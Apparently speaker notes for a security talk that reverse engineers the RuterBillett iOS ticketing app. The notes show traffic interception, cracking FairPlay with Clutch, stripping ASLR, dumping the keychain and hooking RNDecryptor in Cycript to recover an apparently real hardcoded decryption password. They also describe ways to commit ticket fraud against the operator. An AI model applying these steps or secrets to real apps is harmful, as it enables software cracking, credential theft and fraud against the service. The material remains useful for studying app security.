Security presentation:

Tools:
iExplorer - Explore the filesystem
Charles-The-Proxy / mitmproxy / tcpdump - Sniff the traffic
Rested / JetBrains / curl - Make RESTful calls to the server
otool - Apple's command-line disassembler, Mach-O headers
Jailbreak - Requirement for disassembly
Clutch - Decrypt the binary
Hex Fiend / od - Hex Editor for Mac
Hopper - Disassemble the binary, intelligent Obj-C reconstruct
keychain_dumper - Dump the keychain
Cycript - Interactive Objective-C



Protocol dissection:

I took apart the protocol for RuterBillett using Charles. By default you can easily
send HTTP/HTTPS through it. I created a proxy.pac file so I could SOCKS proxy
100% of the traffic. https://gist.github.com/palmerc/8842818

function FindProxyForURL(url, host) {
   return "SOCKS 10.0.1.40:1080";
}



Testing out your understanding of the protocol:

I've tested with JetBrain's paid development tools built-in REST client, but
RESTed in the Mac AppStore is better. I tend to script with curl and have 
written several scripts that can complete a transaction with Ruter's API. The
security on Ruter's side is simply SSL and the use of required headers.

The security is based upon SSL, although the client doesn't take even basic
protections against loading a certificate on the phone and performing a
man-in-the-middle attack. The real problem here, isn't that SSLs protection
can be stripped away but it is that the API itself has no authentication. The
system is equivalent to asking you for what is on the front of the credit
card and not asking for a PIN.

The Base64 encoded animated GIF, the ticket validation system, is the same
on all devices for the whole day, so buying one monthly card allows you to 
capture the animated GIF and redistribute it. This is incredibly weak. Since
the assets in the IPA are provided you could trivially build a mock version
of the app.

The advance time before boarding is imposed client-side, so even if you didn't
share tickets you could greatly reduce the cost of ticket purchases if you 
only bought a ticket when inspectors are present.

The limitation on large purchases requiring a password () is again, client-side.
This is a good thing, except they pass the password, within the SSL connection
as plain text. This is dumb. They should never store anything but a hash of
the password in this system.

All details required to make transactions are contained in the SSL stream
and after one ticket is purchased you can make unlimited purchases with the
same details. The central security details are instance ID and agreement ID.

Conclusion, the Ruter ticketing system is begging for someone to rob them 
blind. Likely already compromised.

 

What can you see when you connect your phone via USB?

Filesystem over USB:

It allows you to browse the individual app bundle and file system.
http://www.macroplant.com/iexplorer/

In terms of Ruter Billett you can immediately grab the Sqlite database out of the 
Documents/ folder. You can also grab out the assets like PNGs.



Interesting an sqlite database just sitting in Documents? Did they do anything
super silly?

SELECT ZAGREEMENTID FROM ZRTPAYMENTAGREEMENT
That would be the binary blob that is the encrypted key to buy tickets 
stored in a public database.

Which brings you to the question, how can I decrypt it?


### Decrypting the binary

First things first. Lets investigate the binary with otool.

yankee:Desktop palmerc$ otool -l RuterBillettEncrypted | grep crypt
RuterBillettEncrypted (architecture armv7):
    cryptoff  16384
    cryptsize 1785856
    cryptid   1
RuterBillettEncrypted (architecture armv7s):
    cryptoff  16384
    cryptsize 1785856
    cryptid   1
    
Tells you the binary is encrypted, cryptid = 1, and the size and offset of the 
FairPlay DRM. Note, two architectures.

yankee:Desktop palmerc$ otool -vh RuterBillettEncrypted 
RuterBillettEncrypted (architecture armv7):
Mach header
      magic cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags
   MH_MAGIC     ARM         V7  0x00     EXECUTE    33       4116   NOUNDEFS DYLDLINK TWOLEVEL PIE
RuterBillettEncrypted (architecture armv7s):
Mach header
      magic cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags
   MH_MAGIC     ARM        V7S  0x00     EXECUTE    33       4116   NOUNDEFS DYLDLINK TWOLEVEL PIE
   
This tells you that PIE (position independent code) flag is present. This has
been the default in Xcode since iOS 6. In terms of security this enables ASLR or
Address Space Layout Randomization. We will want to get rid of this.



Removing the FairPlay DRM can be done one of two ways. Hex editor to flip the CryptID
flag and then a jailbroken phone is used to breakpoint, and dump the decrypted code from
memory back to disk.

Or...

Download Clutch which does the same thing.
https://github.com/KJCracks/Clutch

After jailbreaking ssh to root@<device IP>, password alpine.

Cameron-Palmers-iPhone:~ root# ./Clutch-1.4.2 RuterBillett
Clutch 1.4.2
---------------------------------
Cracking RuterBillett... 
Creating working directory... 
Performing initial analysis... 
dumping binary: analyzing load commands 
dumping binary: obtaining ptrace handle 
dumping binary: forking to begin tracing 
dumping binary: successfully forked 
dumping binary: obtaining mach port 
dumping binary: preparing code resign 
dumping binary: preparing to dump 
dumping binary: performing dump 
dumping binary: patched cryptid 
 [=================================>] 100%
 dumping binary: writing new checksum 
dumping binary: analyzing load commands 
dumping binary: obtaining ptrace handle 
dumping binary: forking to begin tracing 
dumping binary: successfully forked 
dumping binary: obtaining mach port 
dumping binary: preparing code resign 
dumping binary: preparing to dump 
dumping binary: performing dump 
dumping binary: patched cryptid 
 [=================================>] 100%
 dumping binary: writing new checksum 
packaging: waiting for zip thread 
packaging: compressing IPA 
packaging: censoring iTunesMetadata 
fake purchase date 0.000000
current date: 2/13/14, 1:41:20 PM Central European Standard Time
fake purchase date: 1/1/70, 1:00:00 AM Central European Standard Time
packaging: compression level 0 
	/User/Documents/Cracked/RuterBillett-v2.2.1-no-name-cracker-(Clutch-1.4.2).ipa
elapsed time: 2.88s 

Applications cracked:
 
RuterBillett

Total success: 1   Total failed: 0

Verify with otool...
cryptid should be 0.


That wasn't too hard. Let's run that script to remove ASLR. Again you can do this with a
hex editor, but this python script makes life easy.

Cameron-Palmers-iPhone:~ root# ./change_mach_o_flags.py --help
Usage: change_mach_o_flags.py [options] <executable_path>

Options:
  -h, --help         show this help message and exit
  --executable-heap  Clear the MH_NO_HEAP_EXECUTION bit
  --no-pie           Clear the MH_PIE bit
  
$ change_mach_o_flags.py --no-pie ./RuterBillett

Verify with otool...
PIE flag is gone.

Copy of the binary to your Mac.

### Dump the Keychain
One more thing before we go, let's dump the keychain

./keychain_dumper | grep -i -C 6 ruter

Generic Password
----------------
Service: no.ruter.RuterBillett
Account: uniqueInstallationIdentifier
Entitlement Group: 492GFJ36XV.no.ruter.RuterBillett
Label: 
Generic Field: uniqueInstallationIdentifier
Keychain Data: DFF110E3-99FA-492D-BC42-1FC286851382

Curious. Is this the password? How can I test it? And where does this leave us in the
hunt for the password to decrypt that blob?
Keychain on phone (strong possibility)
User defaults (easily checked) InstanceId is the only thing of interest.
Core Data (checked, doesn't seem to be)
Other file on disk (doesn't jump out at me)
Hardcoded in the app (let's check)

BTW On the jailbroken phone I tried changing my password and it had no impact on the blob.
So the decryption of the blob is unrelated to the storage. That is stored on Ruter's 
servers.

### Strings on in the binary
Running strings on the binary will tell us quite a lot
yankee:Desktop palmerc$ strings RuterBillettDecrypted | less
...
https://testebsservices.ruter.no/%@/RuterMobile/
https://services.ruter.no/%@/RuterMobile/
...
brOQhod5kp2T2cQdvY8jOVqio5JZX6
...
cad7542b-eccf-4ed2-8400-f012bb9ee01c
...


That 'br' (30 characters) string looks exactly like a hardcoded password.
UUID is interesting.
RT.* is the prefix for the app class names. Clearly has pulled in a number of third party
libraries like TestFlight, CocoaLumberjack, Google Analytics.


### Disassembly with Hopper
Back to the Mac:

Running strings on the binary yielded a few more interesting password candidates.


Disassembly, debugging the binary. First, thing I searched for was AgreementID and that
immediately revealed a selector called decryptData:withPassword:error:. Boom

That is part of a 3rd party library called RNCryptor.
Reveal the source, please.
https://github.com/RNCryptor/RNCryptor

### Getting the app password
+ (NSData *)decryptData:(NSData *)theCipherText withPassword:(NSString *)aPassword error:(NSError **)anError
{
  RNDecryptor *cryptor = [[self alloc] initWithPassword:aPassword
                                                handler:^(RNCryptor *c, NSData *d) {}];
  return [self synchronousResultForCryptor:cryptor data:theCipherText error:anError];
}

That's the class method source. Now all I need to do to capture the password is to inspect
that value...

As an aside I constructed a script called DecryptMe that takes the blob and tries the same 
RNDecryptor class method. None of my password candidates worked. Rats.

And that led me to cycript and where things become truly interesting.
http://www.cycript.org/

Cycript (pronounced ssscript) is a project by Saurik maker of the Cydia jailbroken app
store. And if you take one thing away from this presentation, you should try this out.
Cycript is a read-eval-print loop, or objective-C interpreter. When combined with mobile
substrate it is frightening.

The Cydia substrate which is Android and iOS compatible can be found at
http://www.cydiasubstrate.com

### Demo ###

UIApplication.sharedApplication.statusBar.subviews[1].backgroundColor = [UIColor redColor]
[SBTelephonyManager.sharedTelephonyManager setOperatorName:"Shortcut"]

Finally, let's get the password:

RNDecryptor.messages
var origInit = RNDecryptor.messages['initWithPassword:handler:']
var secret = ""
RNDecryptor.messages['initWithPassword:handler:'] = function(pass, handle) {
   secret = pass
   return origInit(pass, handle)
}


cy# RTSettings.getInstance.canDecryptInstanceID

cy# secret
@"brOQhod5kp2T2cQdvY8jOVqio5JZX6DFF110E3-99FA-492D-BC42-1FC286851382"

They concatenated the string in the binary with the identifier from the keychain.

The End.



